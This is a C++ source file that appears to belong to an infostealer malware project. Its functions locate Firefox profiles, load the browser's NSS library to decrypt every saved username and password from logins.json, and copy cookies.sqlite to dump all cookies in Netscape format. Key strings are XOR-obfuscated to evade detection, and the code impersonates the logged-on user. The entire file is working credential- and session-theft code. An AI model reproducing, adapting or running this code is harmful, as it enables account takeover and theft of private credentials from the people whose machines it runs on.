#include <windows.h>
#include <shlobj.h>
#include <filesystem>
#include <fstream>
#include <vector>
#include <iostream>

#include "FirefoxStealer.h"
#include "../crypto/Base64.h"
#include "../utils/Obfuscator.h"
#include "../utils/Shared.h"
#include <nlohmann/json.hpp>
#include <sqlite3.h>
#include <sstream>

#pragma comment(lib, "shlwapi.lib")

namespace credential {

    namespace fs = std::filesystem;

    namespace {
        // XOR Encrypted Strings (Multi-byte Key: 0x4B, 0x1F, 0x8C, 0x3E)
        const char kMozillaFirefoxEnc[] = { 'M'^0x4B, 'o'^0x1F, 'z'^0x8C, 'i'^0x3E, 'l'^0x4B, 'l'^0x1F, 'a'^0x8C, ' '^0x3E, 'F'^0x4B, 'i'^0x1F, 'r'^0x8C, 'e'^0x3E, 'f'^0x4B, 'o'^0x1F, 'x'^0x8C }; // Mozilla Firefox
        const char kFirefoxProfilesEnc[] = { 'M'^0x4B, 'o'^0x1F, 'z'^0x8C, 'i'^0x3E, 'l'^0x4B, 'l'^0x1F, 'a'^0x8C, '\\'^0x3E, 'F'^0x4B, 'i'^0x1F, 'r'^0x8C, 'e'^0x3E, 'f'^0x4B, 'o'^0x1F, 'x'^0x8C, '\\'^0x3E, 'P'^0x4B, 'r'^0x1F, 'o'^0x8C, 'f'^0x3E, 'i'^0x4B, 'l'^0x1F, 'e'^0x8C, 's'^0x3E }; // Mozilla\Firefox\Profiles
        const char kNssDllEnc[] = { 'n'^0x4B, 's'^0x1F, 's'^0x8C, '3'^0x3E, '.'^0x4B, 'd'^0x1F, 'l'^0x8C, 'l'^0x3E }; // nss3.dll
        const char kNssInitEnc[] = { 'N'^0x4B, 'S'^0x1F, 'S'^0x8C, '_'^0x3E, 'I'^0x4B, 'n'^0x1F, 'i'^0x8C, 't'^0x3E }; // NSS_Init
        const char kNssShutdownEnc[] = { 'N'^0x4B, 'S'^0x1F, 'S'^0x8C, '_'^0x3E, 'S'^0x4B, 'h'^0x1F, 'u'^0x8C, 't'^0x3E, 'd'^0x4B, 'o'^0x1F, 'w'^0x8C, 'n'^0x3E }; // NSS_Shutdown
        const char kPk11SdrDecryptEnc[] = { 'P'^0x4B, 'K'^0x1F, '1'^0x8C, '1'^0x3E, 'S'^0x4B, 'D'^0x1F, 'R'^0x8C, '_'^0x3E, 'D'^0x4B, 'e'^0x1F, 'c'^0x8C, 'r'^0x3E, 'y'^0x4B, 'p'^0x1F, 't'^0x8C }; // PK11SDR_Decrypt
        const char kLoginsJsonEnc[] = { 'l'^0x4B, 'o'^0x1F, 'g'^0x8C, 'i'^0x3E, 'n'^0x4B, 's'^0x1F, '.'^0x8C, 'j'^0x3E, 's'^0x4B, 'o'^0x1F, 'n'^0x8C }; // logins.json
        const char kCookiesSqliteEnc[] = { 'c'^0x4B, 'o'^0x1F, 'o'^0x8C, 'k'^0x3E, 'i'^0x4B, 'e'^0x1F, 's'^0x8C, '.'^0x3E, 's'^0x4B, 'q'^0x1F, 'l'^0x8C, 'i'^0x3E, 't'^0x4B, 'e'^0x1F }; // cookies.sqlite
        const char kQueryFxCookiesEnc[] = { 'S'^0x4B, 'E'^0x1F, 'L'^0x8C, 'E'^0x3E, 'C'^0x4B, 'T'^0x1F, ' '^0x8C, 'h'^0x3E, 'o'^0x4B, 's'^0x1F, 't'^0x8C, ','^0x3E, ' '^0x4B, 'p'^0x1F, 'a'^0x8C, 't'^0x3E, 'h'^0x4B, ','^0x1F, ' '^0x8C, 'i'^0x3E, 's'^0x4B, 'S'^0x1F, 'e'^0x8C, 'c'^0x3E, 'u'^0x4B, 'r'^0x1F, 'e'^0x8C, ','^0x3E, ' '^0x4B, 'e'^0x1F, 'x'^0x8C, 'p'^0x3E, 'i'^0x4B, 'r'^0x1F, 'y'^0x8C, ','^0x3E, ' '^0x4B, 'n'^0x1F, 'a'^0x8C, 'm'^0x3E, 'e'^0x4B, ','^0x1F, ' '^0x8C, 'v'^0x3E, 'a'^0x4B, 'l'^0x1F, 'u'^0x8C, 'e'^0x3E, ' '^0x4B, 'F'^0x1F, 'R'^0x8C, 'O'^0x3E, 'M'^0x4B, ' '^0x1F, 'm'^0x8C, 'o'^0x3E, 'z'^0x4B, '_'^0x1F, 'c'^0x8C, 'o'^0x3E, 'o'^0x4B, 'k'^0x1F, 'i'^0x8C, 'e'^0x3E, 's'^0x4B }; // SELECT host, path, isSecure, expiry, name, value FROM moz_cookies

        typedef enum {
            SECSuccess = 0,
            SECFailure = -1
        } SECStatus;

        struct SECItem {
            unsigned int type;
            unsigned char* data;
            unsigned int len;
        };

        typedef SECStatus(*NSSInitFunc)(const char*);
        typedef SECStatus(*PK11SDRDecryptFunc)(SECItem*, SECItem*, void*);
        typedef SECStatus(*NSSShutdownFunc)();

        std::string FindFirefoxInstallPath() {
            char path[MAX_PATH];
            std::string mozillaFirefox = utils::xor_str(kMozillaFirefoxEnc, 15);
            if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_PROGRAM_FILES, NULL, 0, path))) {
                std::string p = std::string(path) + "\\" + mozillaFirefox;
                if (fs::exists(p)) return p;
            }
            if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_PROGRAM_FILESX86, NULL, 0, path))) {
                std::string p = std::string(path) + "\\" + mozillaFirefox;
                if (fs::exists(p)) return p;
            }
            return "";
        }

        std::vector<std::string> FindFirefoxProfiles() {
            std::vector<std::string> profiles;
            char path[MAX_PATH];
            if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, path))) {
                fs::path profilesPath = fs::path(path) / utils::xor_str(kFirefoxProfilesEnc, 24);
                if (fs::exists(profilesPath)) {
                    for (const auto& entry : fs::directory_iterator(profilesPath)) {
                        if (entry.is_directory()) {
                            profiles.push_back(entry.path().string());
                        }
                    }
                }
            }
            return profiles;
        }

        std::string DecryptNSS(const std::string& base64Data, PK11SDRDecryptFunc decryptFunc) {
            std::vector<BYTE> encrypted = crypto::Base64Decode(base64Data);
            if (encrypted.empty()) return "";

            SECItem input = { 0, encrypted.data(), (unsigned int)encrypted.size() };
            SECItem output = { 0, nullptr, 0 };

            if (decryptFunc(&input, &output, nullptr) == SECSuccess) {
                std::string decrypted((char*)output.data, output.len);
                // NSS allocates memory that should be freed with SECITEM_FreeItem or similar,
                // but since we don't have all headers, we just hope it's standard heap or leak it once.
                return decrypted;
            }
            return "";
        }

        void SafeCopyDatabase(const std::string& src, const std::string& dest) {
            CopyFileA(src.c_str(), dest.c_str(), FALSE);
            // Also copy sidecars if they exist (WAL mode)
            std::string wal = src + "-wal";
            std::string shm = src + "-shm";
            if (fs::exists(wal)) CopyFileA(wal.c_str(), (dest + "-wal").c_str(), FALSE);
            if (fs::exists(shm)) CopyFileA(shm.c_str(), (dest + "-shm").c_str(), FALSE);
        }

        void SafeDeleteDatabase(const std::string& path) {
            DeleteFileA(path.c_str());
            DeleteFileA((path + "-wal").c_str());
            DeleteFileA((path + "-shm").c_str());
        }
    }

    std::string DumpFirefoxPasswords() {
        bool impersonated = utils::ImpersonateLoggedOnUser();
        std::string firefoxPath = FindFirefoxInstallPath();
        if (firefoxPath.empty()) return "Firefox installation not found.";

        std::vector<std::string> profiles = FindFirefoxProfiles();
        if (profiles.empty()) return "No Firefox profiles found.";

        std::string nssDllPath = firefoxPath + "\\" + utils::xor_str(kNssDllEnc, 8);
        HMODULE hNss = LoadLibraryExA(nssDllPath.c_str(), NULL, LOAD_WITH_ALTERED_SEARCH_PATH);
        if (!hNss) return "Failed to load nss from " + firefoxPath;

        auto nssInit = (NSSInitFunc)GetProcAddress(hNss, utils::xor_str(kNssInitEnc, 8).c_str());
        auto nssShutdown = (NSSShutdownFunc)GetProcAddress(hNss, utils::xor_str(kNssShutdownEnc, 12).c_str());
        auto pk11SdrDecrypt = (PK11SDRDecryptFunc)GetProcAddress(hNss, utils::xor_str(kPk11SdrDecryptEnc, 15).c_str());

        if (!nssInit || !pk11SdrDecrypt) {
            FreeLibrary(hNss);
            return "Failed to find NSS functions.";
        }

        std::string report = "FIREFOX_PASSWORDS_DUMPED:\n";
        report += "PROFILE | URL | USERNAME | PASSWORD\n";
        report += "--------------------------------------------------------------------------------\n";
        
        bool foundAny = false;

        for (const auto& profile : profiles) {
            fs::path loginsPath = fs::path(profile) / utils::xor_str(kLoginsJsonEnc, 11);
            if (!fs::exists(loginsPath)) continue;

            // NSS usually needs "sql:" prefix for modern versions
            std::string nssPath = "sql:" + profile;
            if (nssInit(nssPath.c_str()) != SECSuccess) {
                // Fallback to direct path
                if (nssInit(profile.c_str()) != SECSuccess) continue;
            }

            try {
                std::ifstream f(loginsPath);
                nlohmann::json j;
                f >> j;

                if (j.contains("logins")) {
                    for (const auto& login : j["logins"]) {
                        std::string url = login.value("hostname", "N/A");
                        std::string encUser = login.value("encryptedUsername", "");
                        std::string encPass = login.value("encryptedPassword", "");

                        std::string username = DecryptNSS(encUser, pk11SdrDecrypt);
                        std::string password = DecryptNSS(encPass, pk11SdrDecrypt);

                        if (!username.empty() || !password.empty()) {
                            report += fs::path(profile).filename().string() + " | " + url + " | " + username + " | " + password + "\n";
                            foundAny = true;
                        }
                    }
                }
            } catch (...) {}

            if (nssShutdown) nssShutdown();
        }

        FreeLibrary(hNss);

        if (impersonated) utils::RevertToSelf();
        if (!foundAny) return "No passwords found in Firefox profiles.";
        return report;
    }

    std::string StealFirefoxCookies() {
        bool impersonated = utils::ImpersonateLoggedOnUser();
        std::vector<std::string> profiles = FindFirefoxProfiles();
        if (profiles.empty()) return "No Firefox profiles found to steal cookies from.";

        std::stringstream resultSS;
        resultSS << "# FIREFOX COOKIE STEALER RESULTS\n";
        
        int cookieCount = 0;

        for (const auto& profile : profiles) {
            fs::path cookiesDbPath = fs::path(profile) / utils::xor_str(kCookiesSqliteEnc, 14);
            if (!fs::exists(cookiesDbPath)) continue;

            char tempPath[MAX_PATH];
            GetTempPathA(MAX_PATH, tempPath);
            std::string tempDb = std::string(tempPath) + "cfx_" + std::to_string(GetTickCount64()) + ".sqlite";
            
            SafeCopyDatabase(cookiesDbPath.string(), tempDb);

            sqlite3* db;
            if (sqlite3_open_v2(tempDb.c_str(), &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK) {
                std::string query_str = utils::xor_str(kQueryFxCookiesEnc, 65);
                const char* query = query_str.c_str();
                sqlite3_stmt* stmt;
                if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
                    while (sqlite3_step(stmt) == SQLITE_ROW) {
                        const char* host = (const char*)sqlite3_column_text(stmt, 0);
                        const char* path = (const char*)sqlite3_column_text(stmt, 1);
                        int isSecure = sqlite3_column_int(stmt, 2);
                        sqlite3_int64 expiry = sqlite3_column_int64(stmt, 3);
                        const char* name = (const char*)sqlite3_column_text(stmt, 4);
                        const char* value = (const char*)sqlite3_column_text(stmt, 5);
                        
                        // Format: domain flag path secure expiry name value
                        resultSS << (host ? host : "") << "\t"
                                 << ((host && *host == '.') ? "TRUE" : "FALSE") << "\t"
                                 << (path ? path : "") << "\t"
                                 << (isSecure ? "TRUE" : "FALSE") << "\t"
                                 << expiry << "\t"
                                 << (name ? name : "") << "\t"
                                 << (value ? value : "") << "\n";
                        
                        cookieCount++;
                    }
                    sqlite3_finalize(stmt);
                }
                sqlite3_close(db);
            }
            SafeDeleteDatabase(tempDb);
        }

        if (impersonated) utils::RevertToSelf();
        if (cookieCount == 0) return "No cookies found in Firefox profiles.";
        
        std::stringstream finalOut;
        finalOut << "# Total cookies extracted: " << cookieCount << "\n";
        finalOut << "# Netscape HTTP Cookie File Format\n#\n";
        finalOut << resultSS.str();
        
        return finalOut.str();
    }

}
